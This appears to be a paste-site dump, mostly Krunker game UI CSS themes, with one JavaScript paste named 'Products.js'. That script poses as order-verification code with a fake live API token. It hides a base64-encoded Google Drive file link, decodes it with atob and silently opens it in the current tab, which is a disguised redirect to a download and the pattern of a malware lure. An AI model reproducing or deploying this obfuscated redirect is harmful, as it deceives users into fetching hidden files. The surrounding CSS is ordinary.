#freeKRAd,
#rankedBlog,
#doubleXPAd,
#seasonLabel,
#menuClassNameTag,
#doubleClassXPAd,
#mainLogoFace,
.menuItem[onclick$=""showWindow(49)""],
#tlInfHold,
.newsItem,
#bottomLeftChallIcon,
#timerIcon,
#recTimer,
.weapKey,
.weapSkin,
.weapStreak,
.weapStreakHolder,
#bottomLeftTeamType,
#voiceIcon,
#classPreviewCanvas,
#chatSwitchHolder,
#bottomLeftTeamName,
#menuClassIcn,
#myScoreVal,
#kdVal,
#ammoIcon,
#scoreCount .material-icons,
#livesCount .material-icons,
#reloadMsg {
   	display: none !important;
}


    /* Removal V2 */

.button,
#mLevelCont,
#bottomLeftPlayer,
#bottomLeftPlayerLeft,
#bottomLeftPlayerRight,
#bottomLeftTeamType,
#bottomLeftTeamName,
#chatInputHolder,
.greyInner,
.greyInlineInner,
.greyInlineInnerMid,
 #mLevelCont,
.headerBarLeft,
.headerBarRight,
.weapItemInner,
.weapItem,
#leaderContainer,
#bottomLeftHealtBar {
	background-color: transparent;
}

    /* Removal V3 */
.button,
.button:hover {
    	border: hidden ! important;
      transform: none;
}

    /* Removal V4 */

#matchInfo {
	visibility: hidden !important;
}

        /* Useless General Gray Shit */

.greyInner, .greyInlineInner {
    background-color: transparent !important;

}


        /* Health Shit */

        #bottomLeftHealth {
            left: 35%;
            bottom: 5%;
            text-align: center !important;
            background: transparent;
            background-color: transparent;
            position: fixed;
        }

        #bottomLeftHealthBar {
          visibility: hidden;
        }

          #bottomLeftPlayerMid {
            position: fixed;
            bottom: 25px;
            left: 140px;
          }
          #bottomLeftChallIcon {
            display: none;
          }
          #bottomLeftPlayerMid {
            width: var(--hpBarWidth);
          }

          #bottomLeftChallIcon {
            display: none;
          }

#bottomLeftTeamType {
    display: none;
}
  #bottomLeftTeamName {
    display: none;
}
#bottomLeftChallIcon {
    display: none;
}


        /* Hud Icon Shit */

/*Hud Icon*/
#bottomLeftClassImg {
    display: none;
}

#menuMiniProfilePic,#profilePicM {
    content: var(--pic)
}

        /* Weapon */


        #ammoHolder {
            position: fixed;
            transform: unset;
            width: 35px;
            height: 4px;
            size: 20px;
            top: calc(50% + 25px);
            left: calc(49%);
            background-color: transparent;
            background-image: linear-gradient(45deg, white, white);
            text-align: center !important;
        }

        #bottomLeftHealth,
        #ammoVal {
            font-size: 96px;
            font-weight: bolder;
            position: fixed;
            font-family: 'hpammo';
            text-align: center;
        }
        #ammoVal {
            right: 35%;
            bottom: 5%;
            text-align: center;
        }

.weapItemInner, .weapItem {
    display: none;
}

#reloadMsg {
    bottom: calc(50% - 300px);
    border: none;
    color: white;
    font-family: 'Material Icons';
    font-size: 0;
    -webkit-animation-name: spin;
    -webkit-animation-duration: 4000ms;
    -webkit-animation-iteration-count: infinite;
    -webkit-animation-timing-function: linear;
    background-color: transparent;
    width: 60px;
    left: calc(50% - 30px);
    height: 60px;
    line-height: 60px;
    text-align: center;
    padding: unset;
    border-radius: 100%;
}

#reloadMsg::before {
    content: ""autorenew"";
    font-size: 45px;
}


        /* Timer Shit */

#timerInner.topLeftOld, #timerHolder.topLeftOld {
	background-color: transparent;
    transform: translate(-4px, 0px);
    text-shadow: 3px 3px 0 rgba(0,0,0,.3);
    font-size: 48px;
}


#timerVal.topLeftOld {
  font-size: 48px !important;
}

        /* Leader Shit */

.leaderItem {
  color: white;
  font-size: ;
}

#leaderContainer, #leaderboardHolder {
    background-color: transparent;
}

        /* Counters Shit */

.statIcon {
    background-color: transparent;
}

        /* MatchInfo Shit */

#topLeftBottom::after {
    content: var(--Watermark);
	  font-size:25px;
    font-family: 'watermark';
    font-weight: bold;
    letter-spacing: -0.5px;
    background-image: linear-gradient(to right, var(--color), #FFFFFF, var(--color));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: rainbow-animation 300s linear infinite;
    }

    @keyframes rainbow-animation {
        to {
            background-position: 4500vh;
    }
}

#topLeftBottom {
    transform: translate(7px, -60px);
}

#matchInfo {
	visibility: hidden !important;
}

        /* Name Shit */


.leaderNameM {
    color:white !important;
    text-shadow: 3px 3px 0 rgba(0,0,0,.3);
    font-size: 22px !important;
}

.leaderScore {
    color: rgb(255,255,255) !important;
    opacity: 1;
  text-shadow: 3px 3px 0 rgba(0,0,0,.3);
  font-size: 22px;
}

.leaderName span, .leaderNameF span {
    display: none;
}

        /* Chat */

#chatInput {
  background-color: transparent;
    border: none;
}

#chatInputHolder {
  margin-left: -74px;
}

.chatItem {
        font-size: 15px;
        padding-right: 5px;
        max-width: unset;
        background-color: transparent;
        border: transparent;
        color: white;
        text-shadow: 3px 3px 0 rgba(0,0,0,.3);
        margin-top: 0px !important;
        margin-bottom: 0px !important;
}

#chatList {
        background-color: transparent;
        -webkit-mask-image:-webkit-gradient(linear, left top, left bottom, from(rgba(0,0,0,0)), to(rgba(0,0,0,0.75)));
}

#chatList::-webkit-scrollbar {
   display:none;
}

.chatMsg {
    color: #fff !important;
}
.chatMsg span[style*=""#9eeb56""] {
    color: #fff !important;
}
.chatMsg[style=""color:#fc03ec""] {
    color: var(--white) !important;
}

.chatMsg span[style*=""#eb5656""] {
    color: var(--color) !important;
}

.leaderName {
  color: var(--color);
  text-shadow: 3px 3px 0 rgba(0,0,0,.3);
  font-size: 22px;
}

.leaderNameF {
  color: white !important;
  text-shadow: 3px 3px 0 rgba(0,0,0,.3);
  font-size: 22px;
}


/* other */

/*#uiBase {
    height: 117.647058% !important;
    width: 88.235294% !important;
    transform: scale(1.133333, 0.85) !important;
}*/

.menuBtnExit {
  display: none;
}


.menBtnIcn {
  color: white !important;
}

#menuItemContainer {
  top: 0px;
}

#signedOutHeaderBar {
  display: none;
}

#menuClassName, #menuClassSubtext {
  display: none !important;
}

#customizeButton {
    width: auto;
    padding: 0px;
    height: 40px;
    background-color: transparent;
    border: none !important;
    font-size: 40px !important;
    text-shadow: none !important;
}

#customizeButton .material-icons, #classPreviewCanvas {
    display: none;
}

#menuClassContainer {
  bottom: 30px;
  right: 43%;
  z-index: 99999999999;
  text-align: center;
  margin-right: 20px;
}

#hiddenClasses {
    display: flex !important;
    flex-direction: row;
    position: fixed;
    right: 0px;
    bottom: 0;
    height:116px;
    width: 0;
    z-index: 12;
    overflow: hidden;
    align-items: center;
    pointer-events: all;
    color: #fff;
    transition: 0.4s;
}

#hiddenClasses:hover {
    width: 660px;
    color: transparent;
}

#hiddenClasses::after {
    position: fixed;
    content: ""chevron_left"";
    font-family: 'Material Icons';
    font-size: 48px;
    line-height: 120px;
    pointer-events: all;
    right: 0px;
}

#hiddenClasses div {
    display: block;
    width: 64px;
    height: 64px;
    pointer-events: auto;
    image-rendering: pixelated;
    margin-left: 10px;
    object-fit: cover;
}

#hiddenClasses div:hover {
    cursor:pointer;
}

#menuClassPicker0[onclick=""selectClass(0)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_0.png?build=uLz7w);
}

#menuClassPicker1[onclick=""selectClass(1)""] {
    content :url(https://assets.krunker.io/textures/classes/icon_1.png?build=uLz7w);
}

#menuClassPicker2[onclick=""selectClass(2)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_2.png?build=uLz7w);
}

#menuClassPicker3[onclick=""selectClass(3)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_3.png?build=uLz7w);
}

#menuClassPicker4[onclick=""selectClass(4)""] {
    display: none;
}

#menuClassPicker5[onclick=""selectClass(5)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_5.png?build=uLz7w);
}

#menuClassPicker6[onclick=""selectClass(6)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_6.png?build=uLz7w);
}

#menuClassPicker7[onclick=""selectClass(7)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_7.png?build=uLz7w);
}

#menuClassPicker8[onclick=""selectClass(8)""] {
    display: none;;
}

#menuClassPicker9[onclick=""selectClass(9)""] {
    display: none;
}

#menuClassPicker10[onclick=""selectClass(10)""] {
    display: none;
}

#menuClassPicker11[onclick=""selectClass(11)""] {
    display: none;
}

#menuClassPicker12[onclick=""selectClass(12)""] {
    content: url(https://assets.krunker.io/textures/classes/icon_12.png?build=uLz7w);
}

#menuClassPicker13[onclick=""selectClass(13)""] {
    display: none;
}

#menuClassPicker14[onclick=""selectClass(14)""] {
    display: none;
}

#loadingBg {
  background-image: var(--bgpic) !important;
  background-size:cover;
  background-repeat:no-repeat;
  z-index: 999999999;
}

#loadingBg.onMenu {
    display: none;
}

#pingText, .topRightCounters, #pingDisplay {
  color: white !important;
  text-shadow: 3px 3px 0 rgba(0,0,0,.3);
  font-size: 18px;
  margin-top: 20px;
}

.endCard, #endTable {
  background-color: transparent;
}

#endTable {
  text-shadow: 3px 3px 0 rgba(0,0,0,.3);
}

.killStreakItem {
  background-color: transparent;
}

#killStreakHolder {
    margin-right: 100px;
}

/* menu  */

#windowHolder.popupWin, .settingsHeader, .setBodH, #settingsTabLayout, .settingTab, #selectorContainer {
  background-color: transparent;
}


#windowHolder {
    display: block !important;
}

#windowHolder {
    display: block !important;
    opacity: 0;
    transition-duration: 0.3s;
}

#windowHolder[style*=""block""] {
    opacity: 1;
}

#windowHolder[style*=""none""] * {
    pointer-events: none;
}

.setHed {
  border: none;
  background-color: transparent;
}

.settName, .settNameSmall {
    color: white !important;
    border-bottom: none;
}

.sliderVal {
  border: 3px solid transparent !important;
  background-color: transparent;
}

#menuWindow.dark {
    background-image: linear-gradient(0deg, #0c0c0c -20%, #151515 100%);
}

.sliderM {
    background-color: #ffffff10;
    border-radius: 0px !important;
}

.sliderM::-webkit-slider-thumb {
	-webkit-appearance: none;
	appearance: none;
	width: 15px;
	height: 15px;
	border-radius: 0px;
	background: #fff;
	cursor: pointer;
}

.slider:before {
  background-color: transparent;
}


.setSugBox2 {
  display: none;
}

::-webkit-scrollbar, ::-webkit-scrollbar-thumb:hover, ::-webkit-scrollbar-track, ::-webkit-scrollbar-thumb {
  display: none;
}

.settingsHeader {
 backdrop-filter: blur(10px);
}

.inputGrey2 {
    background: transparent;
    color: white;
}

.className, .classWeap,.classXPBar, .classLvl, .classHP {
  display: none;
}

.classCard {
    box-shadow: none;
    background-color: transparent;
    width: 85px;
}

.classImgC {
    filter: drop-shadow(0px 0px 2px white) grayscale(1);
}

.classImgC:hover {
    filter: drop-shadow(0px 0px 2px white) grayscale(0) !important;
    transition: 300ms;
}

#selectorContainer {
    background-color: transparent;
    height: 50px;
}

.selectorItem .selectorIcon {
    display: none;
    height: 30px;
}

.selectorItem {
    height: 30px !important;
}

.selectorItem:hover {
	background-color: transparent !important;
}

.selectedItem {
    border: none !important;
}

.skinCard {
    background-color: transparent;
    border: none !important;
}

.selectorLabel {
  text-shadow: none;
}

.custContainer {
  border: none;
  background-color: transparent;
}

/* menu test */

.menuDebugInfo {
    display: none;
}

#menuRegionLabel {
    font-size:0px;
}

#menuRegionLabel:after {
    font-size: 34px !important;
    content: var(--Watermark);
    opacity: 1;
    font-family: 'watermark';
    font-weight: bold;
    letter-spacing: -0.5px;
    background-image: linear-gradient(to right, var(--color), #FFFFFF, var(--color));
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: rainbow-animation 300s linear infinite;
}

.headerBarRight {
    background-color: transparent;
    margin-top: -20px;
}

#menuItemContainer {
    top: 0;
    background: black;
    background-image: linear-gradient(0deg, #0c0c0c -20%, #151515 100%);
}

#mLevelCont {
    display: none;
}

.headerBarLeft {
    left: 5%;
    background-color: transparent;
}

.progressBar, .verticalSeparator, #menuJNKCount, #menuUsernameContainer, #menuKRCount {
    display: none;
}

.menuItem .menuItemTitle {
    display: none;
}
.menuItem:hover .menBtnIcn {
    transform: none !important;
    color: #FFAAFF !important;
}

.button:hover {
    transform: none !important;
    border: none !important;
}

.button.small {
  border-radius: 0px;
}

#mailIcon:hover {
    transform: none;
    color: #FFAAFF !important;
}

.button.lgn {
    margin-top: 0px;
    background-image: linear-gradient(0deg, #0c0c0c -20%, #151515 100%);
    border-radius: 0px;
    border: none !important;
}

#endTable {
  background-color: transparent;
}

.endCard {
  background-image: linear-gradient(0deg, #0c0c0c -20%, #151515 100%);
}

#subLogoButtons {
    position: absolute;
    top: 0 !important;
    left: 60%;
    transform: translate(-50%,0) scale(.95);
    background-image: linear-gradient(270deg, #0c0c0c -20%, #151515 100%);
    width: 100%;
    margin-left: 20%;
    padding-left: 90%;
    padding-top: 10px;
    padding-bottom: 3px;
    margin-top: -3px;
    height: 5%
}

#menuBtnHost, #menuBtnBrowser, #menuBtnJoin, #inviteButton{
    visibility: hidden !important;
    font-size: 0px !important;
    font-family: 'Material Icons';
}

#menuBtnHost:hover, #menuBtnBrowser:hover, #menuBtnJoin:hover, #inviteButton:hover {
  color: #FFAAFF !important;
}


#menuBtnHost::after {
    visibility: visible !important;
    font-size: 50px !important;
    content: ""edit_note"";
    text-align: center;
}

#menuBtnBrowser::after {
  visibility: visible !important;
  font-size: 50px !important;
  content: ""search"";
}

#inviteButton::after {
  visibility: visible !important;
  font-size: 50px !important;
  content: ""link"";
}

#menuBtnJoin::after {
  visibility: visible !important;
  font-size: 50px !important;
  content: ""person_add"";
}


#instructions {
    display: none;
}

#spectButton [style=""font-size:15px;color:rgba(255,255,255,0.6)""] {
    display:none;
}

.sliderSml {
    visibility:hidden;
}

.sliderSml:after {
    visibility:visible;
    content:'Spectate';
    color:#fff;
    font-size: 28px;
}

input:checked+.sliderSml:after {
    visibility:visible;
    content:'Spectating';
}
#uiBase.onMenu #spectButton {
    top: 5.5%;
    left: 9%;
    visibility: hidden;
}

/* kds */

#killsVal,#deathsVal,#streakVal,#myScoreVal,#kdVal,#killCount:after,#deathCount:after,#streakCount:after,#scoreCount:after {
    font-size:20px;
    color: white ;
}"
MHFDeVqh,Products.js,SpawnKz,JavaScript,Wednesday 9th of April 2025 09:40:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94146/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HjjYrS7n,Default Edit CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:39:37 AM CDT,":root {
--div-grey: transparent !important;
--div-shadow: transparent !important;
--div-black: rgba(0, 0, 0, .3);
}

@font-face {
    font-family: gamefont;
    src: url(""https://dl.dropboxusercontent.com/s/fi/kkb8llljhbfgmayhsd1th/FFFFORWA.TTF?rlkey=2zclz3bjxrs1fx9hb0dyxy896&st=ahwaf28c&dl=0"");
}

* {
    text-shadow: none !important;
    box-shadow: none !important;
    border: transparent !important;
}

#returnHolder,
.endTablePfp,
.flag-icon,
#homeStoreAd,
.headerBarRight,
#streamContainer,
#termsInfo,
#matchInfo.topLeftOld,
.setSugBox2,
.menuItem .menuItemTitle,
.bigMFeatHold,
.carousel,
#bottomLeftTeamName,
#roundsDisplay,
#bubbleContainer,
#chatSwitchHolder,
#policeButton,
.weapStreakHolder,
#timerIcon,
#gameNameHolder {
    display: none !important;
}

#bottomLeftTeamType {
    font-size: 0px;
}

#bottomLeftTeamType:after {
    font-size: 16px !important;
    content: ""health"" !important;
}

#chatList {
        background-color: transparent;
}

#chatList::-webkit-scrollbar {
   display:none;
}

#chatInput {
  background-color: transparent;
    border: none;
}

#chatInputHolder {
  background-color: transparent;
}

#streamContainer,#PC7WaterMark2,.terms,#termsInfo {
  display: none !important;
}

#bottomLeftClassImg, #menuMiniProfilePic, #profilePicM  {
    content: url(https://i.pinimg.com/736x/b8/89/49/b88949b615a691f7ea1bd557cd002279.jpg)
}

#bottomLeftHealthBar {
  bottom: 20px;
}

.nHealthBarSeg {
    background-color: transparent;
    width: -webkit-fill-available;
    margin-right: -4px;
}

.nHealthBarSeg:first-child .nHpBSeg {
    border-top-left-radius: 2px;
    border-bottom-left-radius: 2px;
}

.nHealthBarSeg:last-child .nHpBSeg {
    border-bottom-right-radius: 2px;
    border-top-right-radius: 2px;
}

.nHpBSeg {
    width: 100%;
    border-radius: 0px
}

#bottomLeftHealth {
  margin-top: 14px;
}

#bottomLeftChallIcon {
  visibility: hidden;
}

/*

.weapIcon {
    transform: scale(1)
}

.weapIcon[src*=""melee""],
.weapIcon[src*=""weapons/icon_0""] {
    margin-top: 20px;
}

.weapItem {
    background-color: transparent
}

.weapKey {
    display: none
}

.weapItem[style*=""0.5""] {
    display: none;
} */

.button, .button:hover {
  border: none !important;
}

#instructions {
    font-size: 0px;
    animation: none
}

.instructionsTabs, .instructionsTab {
  background-color: transparent;
  box-shadow: none;
  border-radius: 0px 0px 4px 4px;
  border-top: none !important;
  color: white !important;
  border-top: none !important;
}

#uiBase.onMenu {
    backdrop-filter: blur(3px);
}

/* test */

#killFeed {
position: fixed;
bottom: -250px !important;
left:-2070px !important;
background-color: rgba(0, 0, 0, 0);
color:transparent !important;
filter: none !important;
}

#centerLeaderDisplay {
    top: 10px;
    left:unset;
    right: 10px;
    transform: unset;
    display:block !important;
    width: 580px;
}

.centerLeaderContainer {
    text-align: left;
    color: #fff;
    border-radius: 4px;
    background-color: rgba(0, 0, 0, .3) !important;
}

.centerLeaderContainerInner {
    background-color: transparent !important;
}

#newLeaderDisplay {
    top: 50px;
    left:unset;
    right: 20px;
    transform: unset;
    display:block !important;
}

.newLeaderContainer,.newLeaderTeam {
    background-color:transparent !important;
}

td>.newLeaderItem {
    max-width: 300px;
    min-width: 250px
}

#leaderContainer {
  display: none;
}

/* ammo */

#weapHolder {
    display: block !important;
    z-index: 10;
    bottom: 30px
}

#ammoHolder {
    display: block !important;
    text-align: center;
    width: 100px;
    height: 100px;
    padding-left: 10px;
    padding-right: 200px;
    border-radius: 4px;
    transition-timing-function: linear;
}

#ammoVal {
    font-size: 52px;
    bottom: 5%;
    vertical-align: text-top;
}

#ammoMax,
#ammoIcon {
    display: none
}

.weapSkin {
    background-color: transparent;
    position: fixed;
    bottom: 25px;
    left: unset;
    right: 25px;
    font-size: 12px;
    text-shadow: 1px 1px 0px #1c1c1c, -1px 1px 0px #1c1c1c, -1px -1px 0px #1c1c1c, 1px -1px 0px #1c1c1c, 1px -1px 0px #1c1c1c;
}

.weapItem {
    background-color: transparent
}

.weapKey {
    display: none
}

.weapItem[style*=""0.5""] {
    display: none;
}

.weapIcon {
    margin-right: 40px !important;
    transform: scale(1.4)
}

.weapIcon[src*=""melee""],
.weapIcon[src*=""weapons/icon_0""] {
    margin-top: 20px;
    margin-right: 35px !important;
}

.weapIcon[src*=""melee/icon_44""],
.weapIcon[src*=""melee/icon_18""] {
    margin-top: 0px;
    margin-right: 35px !important;
}

.weapIcon[src*=""weapons/icon_21""] {
    margin-top: 10px !important
}

.weapIcon[src*=""weapons/icon_10""] {
    margin-bottom: 5px !important
}

.weapIcon[src*=""weapons/icon_28""],
.weapIcon[src*=""weapons/icon_26""],
.weapIcon[src*=""weapons/icon_25""],
.weapIcon[src*=""weapons/icon_16""],
.weapIcon[src*=""weapons/icon_23""] {
    margin-top: 0px !important
}

/* MENU */

.menBtnIcn {
  color: white !important;
}

#signedInHeaderBar {
  filter: grayscale(1);
}

.topRightCounters {
  display: none !important;
}
"
rmW6GehZ,Eve-Avant CSS,PhantomGame,CSS,Wednesday 9th of April 2025 09:38:12 AM CDT,"
@font-face {
    font-family: gamefont;
    src: url(https://sh1r0n3k0.github.io/WorkSans-SemiBold.ttf);
}


/* メインロゴ */


#mainLogo {
    position: absolute;
    /* 画像のURLを指定 */
    content: url(https://cdn.discordapp.com/attachments/823344681328836618/1178188267338862612/186_20231126131847.PNG?ex=65753c54&is=6562c754&hm=ed7abddc8d4d7c3dd18b409a0ce7793793b8fb67fac76a7d634ac859dcf7da0e&);
    width: 1000px; /* 大きさ変更 */
    height: auto;
    top: 300px;
}


/* ミニプロフィール画像 */


#menuMiniProfilePic {
    /* 画像のURLを指定 */
    content: url(https://cdn.discordapp.com/attachments/823344681328836618/1177495807621070968/185_20231124152716.png?ex=6572b76d&is=6560426d&hm=a9050543c72da6b728ffe8fe811ad14114ef759f99f963980c8ee3152c297d12&);
    filter: brightness(1);
    border-radius: 0;
    width: 40px; /* 大きさ変更 */
    height: auto;
}


/* プロフィール画像 */


#profilePicM {
    /* 画像のURLを指定 */
    content: url(https://cdn.discordapp.com/attachments/823344681328836618/1177495807621070968/185_20231124152716.png?ex=6572b76d&is=6560426d&hm=a9050543c72da6b728ffe8fe811ad14114ef759f99f963980c8ee3152c297d12&);
    filter: brightness(1);
    border-radius: 0;
    border: none;
    filter: drop-shadow(3px 3px #b60033); /* 影の追加 */
}


/*✅アニメーション*/


@keyframes bounce {
    0%{
        transform: translateY(0); /* 0%の位置で translateY(0) にする */
    }
    25% {
        transform: translateY(-5px); /* 25% の位置で上に 5px 移動 */
    }
    75% {
        transform: translateY(5px); /* 75% の位置で下に 5px 移動 */
    }
}


/*メニューUI*/


/*✅消す*/


/* タイムライン情報とマップ情報を非表示 */


#tlInfHold, #mapInfoHld {
    display: none !important;
}


/* 特定のクラス名が付与された要素を非表示 */


.youNewDiv {
    display: none !important;
}


/* インストラクションを非表示 */


#instructions {
    display: none;
}


/* インストラクションアップデートの背景を透明に */


#instructionsUpdate {
    background-color: transparent;
}


/* ヘッダー右部分、ストア広告、各種広告、利用規約情報を非表示 */


#headerRight, #homeStoreAd, #aContainer, #topRightAdHolder, #streamContainer, #homeStoreAd, #bundlePop, #termsInfo {
    display: none;
}


/* 警察ボタンを非表示 */


#policeButton {
    display: none;
}


/* メニューのクラスアイコンを非表示 */


#menuClassIcn {
    display: none;
}


/* メニューのクラス名タグ、サブテキスト、クラス名を非表示 */


#menuClassNameTag, #menuClassSubtext, #menuClassName {
    display: none;
}


/* カスタマイズボタンのマテリアルアイコンを非表示 */


#customizeButton > .material-icons {
    display: none;
}


/* メニューボタンアイコンを非表示 */


.menBtnIcn {
    display: none !important;
}


/*✅背景*/


/* バックドロップフィルターを使用して背景をぼかし */


#instructionHolder {
    backdrop-filter: blur(6px);

    /* 背景をラジアルグラデーションに設定（中心が中心で、透明から濃い黒にかけてのグラデーション） */
    background: radial-gradient(ellipse at center, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.8) 100%);

    /* バックドロップフィルターがサポートされていない場合のフォールバックとして、透明な赤い色を設定 */
    background-color: rgba(255, 0, 0, 0.4);
}


/*✅左上*/


#signedInHeaderBar.headerBarLeft.headerBar{
width:1000px;
height:auto;
}


/*背景*/


.headerBarLeft, #mLevelCont{
    background-color: transparent;
}


/*名前、数字*/


#menuAccountUsername, #menuKRCount, #menuJNKCount{
    font-size:35px;
    text-shadow: 2px 2px 0px #000;
    color: #b60033;
}

 #mLevelContV{
    font-size:70px;
    text-shadow: 3px 3px 0px #000;
    color: #b60033;
}


/*画像*/


#menuKRCount span, #menuJNKCount span, #mailIcon{
    filter: brightness(0) drop-shadow(1px 1px #b60033);
}

#mailIcon{
filter: brightness(0) drop-shadow(2px 2px #b60033);
 transform: none;
}


/*レベルバー色(中)*/


#menuLevelBar.progressBarInner {
    filter: brightness(0) grayscale(1) contrast(100);
    border-radius: 0;
}


/*レベルバー色(外)*/


#menuLvlHold.progressBar {
    background-color: #b60033;
    border-radius: 0;
}


/*✅右上*/


/* サブロゴボタン全体のスタイル設定 */


#subLogoButtons {
    bottom: unset;
    top: 10px;
    left: unset;
    right: 40px;
    transform: none;
    display: flex;
    flex-direction: column;
    margin-top: 20px;
    align-items: flex-end;
}


/* サブロゴボタン内の各ボタンのスタイル設定 */


#subLogoButtons > .button {
    width: fit-content;
    align-items: baseline;
    flex-grow: unset;
    transform: none;
    background-color: transparent;
    border: none !important;
    font-size: 70px !important;
    padding: 0 !important;
    height: auto;
    margin-top: 20px;
    margin-right: 0;
    margin-left: 0; 
    text-align: right;
    text-shadow: 2px 2px 0px #000;
    color: #b60033;
    transition: color 0.2s ease; /* カーソルホバー時に色が変化するアニメーション設定 */
}


/* サブロゴボタンホバー時のスタイル設定 */


#subLogoButtons > .button:hover {
    color: rgba(0, 0, 0, 0) !important; /* カーソルホバー時、色を透明にする */
}


/*✅右下*/


/* メニューアイテムコンテナ全体に関するスタイル設定 */


#menuItemContainer {
    width: unset;
    height: 480px;
    background-color: transparent;
    right: 30px;
    bottom: 40px;
    top: unset;
    justify-content: space-between;
    align-items: flex-end;
}


/* メニューアイテムに関するスタイル設定 */


.menuItem {
    align-items: baseline;
    flex-grow: unset;
    background-size: 200% 100%;
    background-repeat: no-repeat;
    background-position-x: calc(100% - 1px);
    width: fit-content;
}


/* メニューアイテムタイトルに関するスタイル設定 */


.menuItem .menuItemTitle {
    color: #b60033;
    margin: 0;
    font-size: 48px !important;
    text-transform: uppercase;
    mix-blend-mode: exclusion;
    padding: 0 12px;
    transition: color 0.2s ease; /* カーソルホバー時に色が変化するアニメーション設定 */
    text-shadow: 2px 2px 0px #000;
}


/* メニューアイテムタイトルホバー時のスタイル設定 */


.menuItem .menuItemTitle:hover {
    color: rgba(0, 0, 0, 0) !important; /* カーソルホバー時、色を透明にする */
}


/*✅真ん中下*/


/* メニュークラスコンテナ全体に関するスタイル設定 */


#menuClassContainer {
    right: unset;
    left: unset;
    position: fixed;
    top: 60%;
    left: 20%;
    transform: translate(-50%, -50%);
    display: flex;
    flex-direction: row;
}


/* プレイヤーの見た目に関するスタイル設定 */


#classPreviewCanvas {
    width: 500px !important;
    height: auto !important;
    position: absolute;
    transform: none;
    left: unset;
    bottom: unset;
    top: 160px;
    right: -20px;
    filter: drop-shadow(-3px -1px 0px #000) drop-shadow(3px -1px 0px #000) drop-shadow(0px 3px 0px #000) drop-shadow(3px 3px #b60033);
}

#classPreviewCanvas .img {
    border: 2px solid #000; /* 枠線の設定（太さ、スタイル、色） */
}


/* カスタマイズボタンに関するスタイル設定 */


#customizeButton {
    position: absolute;
    transform: none;
    left: unset;
    bottom: unset;
    top: 500px;
    left: 10px;
    background-color: transparent;
    border: none !important;
    font-size: 55px !important;
    padding: 0 !important;
    width: 270px;
    height: auto;
    margin-top: 20px;
    margin-right: 0;
    margin-left: 0; 
    text-shadow: 2px 2px 0px #000 !important;
    color: #b60033;
    transition: color 0.2s ease; /* 背景色の変化をアニメーション化 */
}

#customizeButton:hover {
    color: rgba(0, 0, 0, 0) !important; /* カーソルホバー時、色を透明にする */
}


/*✅スペクテイターボタン*/


#uiBase.onMenu #spectButton {
    display: flex;
    align-items: center;
    position: absolute;
    top: 440px;
    right: 992px;
    left: unset;
    transform: unset;
    z-index: 2;
    color: rgba(255, 255, 255, 0.5);
    font-size: 18px;
}

#spectButton span {
    font-size: 0 !important;
}


/* スペクテイターボタンのアイコンに関するスタイル設定 */


.sliderSml::before {
    content: ""visibility_off"";
    font-size: 44px;
    color: #fff;
    width: max-content;
    height: auto;
    background-color: transparent;
    text-align: center;
    transition-duration: 0.25s;
    font-family: 'Material Icons';
    left: unset;
    bottom: unset;
    filter: brightness(0);
}


/* スペクテイターボタンがONのときのアイコンと背景に関するスタイル設定 */


input:checked + .sliderSml::before {
    content: ""visibility"";
    transform: unset;
}

input:checked + .sliderSml {
    background-color: transparent !important;
}


/* スペクテイターボタン全体に関するスタイル設定 */


.sliderSml {
    opacity: 1;
    background-color: transparent;
}


/*✅チャットボックス*/


/* メニュー時のチャットホルダーに関するスタイル設定 */


#uiBase.onMenu #chatHolder {
    background: transparent;
    top: 100px;
    left: 10px;
    width: 300px;
}

/* メニュー時のチャットインプットに関するスタイル設定 */


#uiBase.onMenu #chatInput {
    position: absolute;
    left: 10px;
    background-color: #000;
    filter: drop-shadow(2px 2px #b60033);
    border-radius: 0;
}


/*✅プレイヤーページ*/


/* ウィンドウクローザーのスタイル設定 */


#windowCloser {
    background: linear-gradient(to bottom, rgba(182, 0, 51, 0.5), rgba(0, 0, 0, 0.5));
}


/* メニューウィンドウのスタイル設定 */


#menuWindow.dark {
    background-color: transparent !important;
    border: 2px solid #b60033;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}


/* ビッグメンタブのスタイル設定 */


.bigMenTab {
    background-color: #b60033 !important;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}


/* セットヘッダーとセットヘッダースモールのスタイル設定 */


.setHed, .setHedS {
    border: none;
    background-color: #b60033;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}

/* セットヘッダーのホバー時のスタイル設定 */


.setHed:hover {
    background-color: #b60033;
}

/*レベルバー色(中)*/


.xpBarB {
    border-radius: 0;
    background-image: linear-gradient(to right,#b60033,#b60033);
}


/*レベルバー色(外)*/


.xpBar {
    background-color:#000;
}

/*✅設定ページ*/


/* 設定ヘッダーのスタイル設定 */


.settingsHeader {
    background-color: transparent;
}


/* 設定タブのスタイル設定 */


.settingTab {
    background-color: #b60033 !important;
    box-shadow: 3px 3px 0px #000;
    border-radius: 0;
}


/*✅クラスページ*/


/* スタイル設定 */


